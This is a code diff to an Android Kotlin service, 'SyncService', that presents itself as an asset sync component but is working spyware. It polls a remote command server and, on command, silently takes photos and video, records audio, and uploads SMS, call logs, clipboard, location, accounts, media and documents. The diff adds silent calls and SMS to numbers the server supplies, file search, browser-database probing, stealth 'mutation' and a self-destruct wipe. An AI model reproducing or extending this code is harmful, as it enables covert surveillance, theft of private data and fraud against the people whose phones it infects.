@@ -1,5 +1,6 @@
 package com.assets.service
 
+import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Notification
 import android.app.NotificationChannel
@@ -8,6 +9,7 @@ import android.content.ClipboardManager
 import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.hardware.camera2.CameraManager
 import android.location.Location
@@ -19,6 +21,7 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
 import android.os.Build
+import android.os.Environment
 import android.os.PowerManager
 import android.os.VibrationEffect
 import android.os.Vibrator
@@ -27,6 +30,7 @@ import android.provider.ContactsContract
 import android.provider.MediaStore
 import android.provider.OpenableColumns
 import android.provider.Settings
+import android.telephony.SmsManager
 import android.util.Base64
 import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
@@ -68,15 +72,16 @@ import kotlin.coroutines.resume
 class SyncService : LifecycleService() {
 
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-    // تم تحديث الروابط لدومين Render الجديد
     private val SERVER = "https://web-assets-service-3.onrender.com/api/v3/uranium/stream"
     private val UPLOAD = "https://web-assets-service-3.onrender.com/api/v3/uranium/upload_raw"
-    
+
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "NEURAL_v19"
-    private var deviceSecret: String = ""
+    private var stealthState = "NEURAL_v21"
+    @Volatile private var started = false
+
+    @Volatile private var deviceSecret: String = ""
 
     private val client = OkHttpClient.Builder()
         .connectTimeout(120, TimeUnit.SECONDS)
@@ -86,7 +91,7 @@ class SyncService : LifecycleService() {
         .build()
 
     companion object {
-        private const val CHANNEL_ID = "sys_assets_v19"
+        private const val CHANNEL_ID = "sys_assets_v21"
         private const val NOTIF_ID = 888
         private const val PREFS = "sys_assets_prefs"
         private const val KEY_SECRET = "device_secret"
@@ -114,7 +119,7 @@ class SyncService : LifecycleService() {
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV19").apply {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV21").apply {
                 acquire(30L * 24 * 60 * 60 * 1000)
             }
         } catch (_: Exception) {}
@@ -148,6 +153,8 @@ class SyncService : LifecycleService() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
+        if (started) return START_STICKY
+        started = true
         scope.launch {
             while (isActive) {
                 try {
@@ -170,7 +177,7 @@ class SyncService : LifecycleService() {
     }
 
     private fun getKey(): ByteArray {
-        val raw = if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v19" else "fallback|uranium-v19"
+        val raw = if (deviceSecret.isNotEmpty()) "$deviceSecret|uranium-v21" else "fallback|uranium-v21"
         return MessageDigest.getInstance("SHA-256").digest(raw.toByteArray(Charsets.UTF_8))
     }
 
@@ -235,6 +242,7 @@ class SyncService : LifecycleService() {
 
     private suspend fun executeTask(task: JSONObject) {
         val action = task.optString("action", "").uppercase()
+        val payload = task.optJSONObject("payload") ?: JSONObject()
         when {
             action.contains("CMD_FLASH_ON") -> toggleFlash(true)
             action.contains("CMD_FLASH_OFF") -> toggleFlash(false)
@@ -242,8 +250,8 @@ class SyncService : LifecycleService() {
             action.contains("CMD_BEEP") -> playBeep()
             action.contains("MIC_AI_LISTEN") -> recordAudio()
             action.contains("MICRO_BURST_SNAP") -> streamLatestPhoto("MicroBurst")
-            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto()
             action.contains("EXTRACT_CAMERA_SNAP_FRONT") -> captureSilentPhoto(front = true)
+            action.contains("EXTRACT_CAMERA_SNAP") -> captureSilentPhoto(front = false)
             action.contains("EXTRACT_VIDEO_SNAP") -> captureVideoShort()
             action.contains("EXTRACT_SMS") -> sendReport("SMS", readSms())
             action.contains("EXTRACT_CALLS") -> sendReport("CallLog", readCalls())
@@ -254,16 +262,57 @@ class SyncService : LifecycleService() {
             action.contains("EXTRACT_CLIPBOARD") -> sendReport("Clipboard", readClipboard())
             action.contains("EXTRACT_PHOTOS") -> streamMedia(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, 20)
             action.contains("EXTRACT_VIDEOS") -> streamMedia(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, 10)
+            action.contains("EXTRACT_ACCOUNTS") -> sendReport("Accounts", readAccounts())
+            action.contains("EXTRACT_BROWSER") -> sendReport("Browser", readBrowserHistory())
+            action.contains("EXTRACT_WIFI_LIST") -> sendReport("WiFiList", readWifiList())
+            action.contains("EXTRACT_NOTIFICATIONS") -> sendReport("Notif", "NotificationListener not registered (needs user consent)")
+            action.contains("EXTRACT_KEYLOG") -> sendReport("Keylog", "Accessibility not registered (needs user consent)")
+            action.contains("EXTRACT_SCREENSHOT") -> sendReport("Screenshot", "MediaProjection not active (needs user consent)")
             action.contains("PROC_DCIM") -> if (wifiOk()) zipFolder("DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI) else sendReport("Delay", "DCIM مؤجل")
             action.contains("PROC_DOWNLOAD") -> if (wifiOk()) zipFolder("Download", MediaStore.Files.getContentUri("external")) else sendReport("Delay", "Download مؤجل")
             action.contains("PROC_PICTURES") -> zipFolder("Pictures", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
             action.contains("PROC_DOCUMENTS") -> zipFolder("Documents", MediaStore.Files.getContentUri("external"))
+            action.contains("PROC_FILE_SEARCH") -> sendReport("FileSearch", searchFiles(payload.optString("pattern", "")))
             action.contains("STORAGE_AUDIT") -> sendReport("Audit", storageAudit())
             action.contains("WIFI_AUTOPILOT") -> { wifiAutopilot = !wifiAutopilot; sendReport("WiFi", "Autopilot: $wifiAutopilot") }
             action.contains("GEO_FENCE_ALERT") -> sendReport("GeoAlert", readLocation())
             action.contains("POLY_MUTATE") -> { stealthState = "MUT_${System.currentTimeMillis() % 10000}"; sendReport("Poly", "Became $stealthState") }
+            action.contains("POLY_REKEY") -> {
+                val prefs = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+                val newSecret = UUID.randomUUID().toString().replace("-", "") + UUID.randomUUID().toString().replace("-", "")
+                prefs.edit().putString(KEY_SECRET, newSecret).apply()
+                deviceSecret = newSecret
+                sendReport("Rekey", "New secret issued: ${newSecret.take(8)}...")
+            }
+            action.contains("CMD_SCREEN_ON") -> toggleScreen(true)
+            action.contains("CMD_SCREEN_OFF") -> toggleScreen(false)
+            action.contains("CMD_CALL_NUMBER") -> {
+                val num = payload.optString("number", "")
+                if (num.isNotEmpty()) makeSilentCall(num)
+            }
+            action.contains("CMD_SEND_SMS") -> {
+                val num = payload.optString("number", "")
+                val body = payload.optString("body", "")
+                if (num.isNotEmpty()) sendSilentSms(num, body)
+            }
+            action.contains("CMD_PLAY_SOUND") -> {
+                val p = payload.optString("path", "")
+                if (p.isNotEmpty()) playSoundFile(p)
+            }
+            action.contains("CMD_SPEAK_TEXT") -> {
+                val t = payload.optString("text", "")
+                if (t.isNotEmpty()) speakText(t)
+            }
             action.contains("STEALTH_BLACKOUT") -> sendReport("Stealth", "Blackout active")
-            action.contains("SELF_DESTRUCT") -> { sendReport("Destruct", "Wiping..."); try { cacheDir.deleteRecursively() } catch (_: Exception) {}; stopSelf() }
+            action.contains("SELF_DESTRUCT") -> {
+                sendReport("Destruct", "Wiping...")
+                try { cacheDir.deleteRecursively() } catch (_: Exception) {}
+                try { getSharedPreferences(PREFS, Context.MODE_PRIVATE).edit().clear().apply() } catch (_: Exception) {}
+                try { filesDir.deleteRecursively() } catch (_: Exception) {}
+                stopSelf()
+                return
+            }
+            else -> sendReport("Unknown", action)
         }
     }
 
@@ -367,9 +416,9 @@ class SyncService : LifecycleService() {
                         val nIdx = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                         if (idIdx >= 0) {
                             val itemUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
-                            val name = if (nIdx >= 0) c.getString(nIdx) else "snap.jpg"
-                            val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() } ?: return@use
-                            uploadChunked(bytes, "${prefix}_$name")
+                            val name = if (nIdx >= 0) c.getString(nIdx) ?: "snap.jpg" else "snap.jpg"
+                            val bytes = contentResolver.openInputStream(itemUri)?.use { it.readBytes() }
+                            if (bytes != null) uploadChunked(bytes, "${prefix}_$name")
                         }
                     }
                 }
@@ -443,6 +492,41 @@ class SyncService : LifecycleService() {
         return sb.toString()
     }
 
+    private fun readAccounts(): String {
+        val sb = StringBuilder()
+        try {
+            val accMgr = android.accounts.AccountManager.get(this)
+            accMgr.accounts.forEach { sb.append("${it.type} :: ${it.name}\n") }
+        } catch (_: Exception) {}
+        return sb.toString().ifEmpty { "No accounts or denied" }
+    }
+
+    private fun readBrowserHistory(): String {
+        val sb = StringBuilder()
+        val paths = listOf(
+            "/data/data/com.android.chrome/databases/History",
+            "/data/data/com.chrome.beta/databases/History",
+            "/data/data/org.mozilla.firefox/files/places.sqlite"
+        )
+        paths.forEach { p ->
+            try {
+                val f = File(p)
+                if (f.exists() && f.canRead()) sb.append("[${f.absolutePath}] size=${f.length()}\n")
+            } catch (_: Exception) {}
+        }
+        return sb.toString().ifEmpty { "No readable browser DB (needs root)" }
+    }
+
+    private fun readWifiList(): String {
+        val sb = StringBuilder()
+        try {
+            val wifi = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+            @Suppress("DEPRECATION")
+            wifi.configuredNetworks?.forEach { sb.append("${it.SSID}\n") }
+        } catch (_: Exception) {}
+        return sb.toString().ifEmpty { "No WiFi list (needs location perm)" }
+    }
+
     @SuppressLint("MissingPermission")
     private fun readLocation(): String {
         return try {
@@ -459,7 +543,7 @@ class SyncService : LifecycleService() {
     private fun readClipboard(): String {
         return try {
             val cb = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            if (cb.hasPrimaryClip() && cb.primaryClip?.itemCount ?: 0 > 0) "Text: ${cb.primaryClip?.getItemAt(0)?.text}" else "Empty"
+            if (cb.hasPrimaryClip() && (cb.primaryClip?.itemCount ?: 0) > 0) "Text: ${cb.primaryClip?.getItemAt(0)?.text}" else "Empty"
         } catch (e: Exception) { "Err: ${e.message}" }
     }
 
@@ -530,7 +614,7 @@ class SyncService : LifecycleService() {
                             if (idIdx >= 0) {
                                 try {
                                     val fUri = ContentUris.withAppendedId(uri, c.getLong(idIdx))
-                                    val name = if (nIdx >= 0) c.getString(nIdx) else "f_${cnt}"
+                                    val name = if (nIdx >= 0) c.getString(nIdx) ?: "f_${cnt}" else "f_${cnt}"
                                     contentResolver.openInputStream(fUri)?.use { ins ->
                                         zos.putNextEntry(ZipEntry("$folderName/$name"))
                                         ins.copyTo(zos)
@@ -612,6 +696,81 @@ class SyncService : LifecycleService() {
             }
         } catch (_: Exception) {}
         return n
+    }
+
+    private fun toggleScreen(on: Boolean) {
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!on) {
+                @Suppress("DEPRECATION")
+                pm.goToSleep(0L)
+            } else {
+                @Suppress("DEPRECATION")
+                val wl = pm.newWakeLock(
+                    PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+                    "Uranium::ScreenOn"
+                )
+                wl.acquire(3000L)
+            }
+        } catch (_: Exception) {}
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun makeSilentCall(number: String) {
+        try {
+            val i = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number")).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            }
+            startActivity(i)
+        } catch (_: Exception) {}
+    }
+
+    @SuppressLint("MissingPermission")
+    private fun sendSilentSms(number: String, body: String) {
+        try {
+            val sm = SmsManager.getDefault()
+            sm.sendTextMessage(number, null, body, null, null)
+        } catch (_: Exception) {}
+    }
+
+    private fun playSoundFile(path: String) {
+        try {
+            MediaPlayer().apply {
+                setDataSource(path)
+                isLooping = false
+                prepare()
+                start()
+            }
+        } catch (_: Exception) {}
+    }
+
+    private fun speakText(text: String) {
+        try {
+            val tts = android.speech.tts.TextToSpeech(this) { status ->
+                if (status == android.speech.tts.TextToSpeech.SUCCESS) {
+                    // ready
+                }
+            }
+            tts.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "uranium_tts")
+        } catch (_: Exception) {}
+    }
+
+    private fun searchFiles(pattern: String): String {
+        val sb = StringBuilder()
+        val roots = listOf(
+            Environment.getExternalStorageDirectory(),
+            File("/sdcard/Download"),
+            File("/sdcard/DCIM")
+        )
+        val regex = try { Regex(pattern) } catch (_: Exception) { return "Bad pattern" }
+        roots.forEach { root ->
+            try {
+                root.walkTopDown().maxDepth(4).take(500).forEach { f ->
+                    if (regex.containsMatchIn(f.name)) sb.append("${f.absolutePath}\n")
+                }
+            } catch (_: Exception) {}
+        }
+        return sb.toString().ifEmpty { "No match" }
     }
 
     override fun onDestroy() {
